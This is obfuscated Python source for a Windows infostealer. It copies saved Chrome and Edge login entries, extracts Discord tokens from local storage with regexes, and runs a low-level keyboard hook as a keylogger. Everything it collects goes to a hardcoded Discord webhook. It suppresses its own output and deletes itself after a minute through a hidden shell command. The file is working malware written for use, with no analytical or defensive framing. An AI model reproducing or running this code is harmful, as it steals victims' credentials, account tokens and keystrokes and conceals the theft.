import os as A,json,base64,sqlite3 as L,shutil as M,ctypes as B,threading as G,re,sys as D,io,time,subprocess as F
from urllib.request import Request as H,urlopen as I
from ctypes import wintypes as J
D.stdout=io.StringIO()
D.stderr=io.StringIO()
C=B.windll.user32
K=B.windll.kernel32
P=B.windll.crypt32
N='https://discord.com/api/webhooks/1485926259719536700/vzGqH0iDB-xEgMU53eoU5d7HmuVzOURO2s3KyccOOaIAha62fkMtG2kBGFjyqHy04zJy'
class O:
	def __init__(B):B.log='';B.local=A.getenv('LOCALAPPDATA');B.roaming=A.getenv('APPDATA');B.temp=A.getenv('TEMP');B.pc_user=A.getlogin();B.exe_path=D.executable;B.roots={'CHROME':B.local+'\\Google\\Chrome\\User Data','EDGE':B.local+'\\Microsoft\\Edge\\User Data'}
	def _send(C,content):
		try:
			A=json.dumps({'content':content[:2000]}).encode('utf-8');B=H(N,data=A,headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'})
			with I(B)as D:0
		except:pass
	def self_destruct(A):B=f'choice /C Y /N /T 3 /D Y & del "{A.exe_path}" & del "%~f0"';F.Popen(B,shell=True,creationflags=F.CREATE_NO_WINDOW);D.exit()
	def grab_browsers(B):
		for(F,C)in B.roots.items():
			if not A.path.exists(C):continue
			G=['Default']
			try:G+=[A for A in A.listdir(C)if A.startswith('Profile')]
			except:pass
			for D in G:
				H=A.path.join(C,D,'Login Data')
				if A.path.exists(H):
					E=A.path.join(B.temp,f"v14_{F}_{D}.db")
					try:
						M.copy2(H,E);I=L.connect(E);J=I.cursor();J.execute('SELECT origin_url, username_value FROM logins');K=[f"{A[0]} | {A[1]}"for A in J.fetchall()if A[1]]
						if K:B._send(f"**[{F} - {D}]**\n"+'\n'.join(K[:15]))
						I.close();A.remove(E)
					except:pass
	def grab_discord(B):
		C=[];G=[B.roaming+'\\discord\\Local Storage\\leveldb\\',B.roaming+'\\discordcanary\\Local Storage\\leveldb\\',B.local+'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\']
		for D in G:
			if not A.path.exists(D):continue
			try:
				for E in A.listdir(D):
					if E.endswith('.log')or E.endswith('.ldb'):
						with open(A.path.join(D,E),errors='ignore')as H:
							for I in H.readlines():
								for J in re.findall('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}|dQw4w9WgXcQ:[^.*[\'\\"(.*)\'\\"]]{1,120}',I):
									F=J.split('"')[0].split('}')[0].split('\\')[0].strip()
									if F not in C:C.append(F)
			except:pass
		if C:B._send(f"**[DISCORD - {B.pc_user}]**\n"+'\n'.join(C))
	def keylogger(A):
		def E(n,w,l):
			if n>=0 and w==256:
				try:
					D=B.cast(l,B.POINTER(B.c_long)).contents.value;A.log+=chr(C.MapVirtualKeyW(D,2))
					if len(A.log)>100:A._send(f"**[{A.pc_user}]** {A.log}");A.log=''
				except:pass
			return C.CallNextHookEx(None,n,w,l)
		F=B.WINFUNCTYPE(B.c_int,B.c_int,B.c_int,B.POINTER(B.c_void_p))(E);C.SetWindowsHookExW(13,F,K.GetModuleHandleW(None),0);D=J.MSG()
		while C.GetMessageW(B.byref(D),0,0,0)!=0:C.TranslateMessage(D);C.DispatchMessageW(D)
if __name__=='__main__':E=O();E.grab_browsers();E.grab_discord();G.Thread(target=E.keylogger,daemon=True).start();time.sleep(60);E.self_destruct()